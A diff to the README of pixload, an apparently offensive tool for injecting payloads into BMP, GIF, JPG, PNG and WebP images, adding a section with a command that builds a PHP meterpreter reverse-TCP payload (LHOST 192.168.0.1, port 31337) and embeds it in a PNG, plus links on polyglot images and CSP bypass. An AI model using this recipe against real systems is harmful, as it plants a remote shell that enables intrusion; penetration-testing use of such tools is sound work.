@@ -6,6 +6,8 @@ Set of tools for ~~hiding backdoors~~ creating/injecting payload into images.
 
 The following image types are currently supported: BMP, GIF, JPG, PNG, WebP.
 
+#### about
+
 Useful references for better understanding of `pixload` and its use-cases:
 
 - [Bypassing CSP using polyglot JPEGs](https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs)
@@ -22,6 +24,17 @@ If you want to encode a payload in such a way that the resulting binary blob is
 both valid x86 shellcode and a valid image file, I recommend you to look
 [here](https://warroom.securestate.com/bmp-x86-polyglot/) and
 [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/bmp_polyglot.rb).
+
+#### msfvenom
+
+If you want to inject a metasploit payload, try something like this:
+
+```bash
+msfvenom -p php/meterpreter_reverse_tcp \
+	LHOST=192.168.0.1 LPORT=31337 -f raw > payload.php
+# Edit payload.php if need.
+./pixload/png.pl -payload "$(cat payload.php)" -output payload.png
+```
 
 ## SETUP
 
